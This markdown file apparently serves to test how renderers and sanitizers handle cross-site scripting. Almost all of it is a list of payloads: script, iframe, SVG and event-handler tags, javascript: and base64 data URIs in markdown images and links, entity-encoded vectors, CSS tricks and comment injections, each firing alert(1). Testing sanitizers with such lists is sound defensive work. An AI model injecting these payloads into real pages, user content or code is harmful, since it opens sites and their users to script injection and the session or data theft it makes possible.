# 💥 XSS Payload Injection Test

A complete collection of possible XSS payloads, including raw HTML, encoded payloads, SVG vectors, and data URIs.

---

## 🔥 Raw HTML Payloads

<script>alert('XSS')</script>  
<iframe src="javascript:alert('XSS')"></iframe>  
<img src=x onerror=alert(1)>  
<body onload=alert(1)>   
<svg/onload=alert(1)>  
<marquee onstart=alert(1)>XSS</marquee>  
<video><source onerror="alert(1)"></video>  
<math><mtext><svg><animate attributeName="href" values="javascript:alert(1)" /></svg></mtext></math>  
<input autofocus onfocus=alert(1)>  
<textarea autofocus onfocus=alert(1)>test</textarea>  
<div onmouseover="alert(1)">Hover me</div>  
<details open ontoggle=alert(1)><summary>XSS</summary></details>  
<keygen autofocus onfocus=alert(1)>  
<object data="javascript:alert(1)">XSS</object>  
<embed src="data:text/html,<script>alert(1)</script>">  
<svg><script>alert(1)</script></svg>  
<svg><a xlink:href="javascript:alert(1)">X</a></svg>  

---

## 🖼️ Markdown Image-Based Payloads

![xss](javascript:alert(1))  
![xss](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)  
![xss]("onerror='alert(1)'")  
![xss][1]  
[1]: javascript:alert(1)

---

## 🔗 Link Injection Payloads

[Click Here](javascript:alert(1))  
[Exploit](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)  
[SVG Click](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)  

---

## 🎭 Encoded Payloads

<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>  
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>  
<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>Click</a>  

---

## 🧪 CSS & Style-Based Payloads

<div style="background-image:url(javascript:alert(1))">XSS</div>  
<div style="animation-name:x;" onanimationstart="alert(1)">XSS</div>  

---

## 🧬 Event Attribute Payloads

<a href="#" onclick="alert(1)">Click</a>  
<button onclick=alert(1)>Click</button>  
<video autoplay onplay="alert(1)">  
<svg><g onload=alert(1)></g></svg>  
<iframe srcdoc="<script>alert(1)</script>"></iframe>  

---

## 🧨 Edge Case/Obscure Payloads

<input type="text" value="test" onblur="alert(1)" autofocus>  
<form><button formaction="javascript:alert(1)">Submit</button></form>  
<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>  
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">Encoded Link</a>  

---

## 💣 Comment Injection

<!-- <img src=x onerror=alert(1)> -->  
<!-- <script>alert(1)</script> -->  

---

## 🧱 Inside Code Blocks

```html
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<iframe src="javascript:alert('XSS')"></iframe>
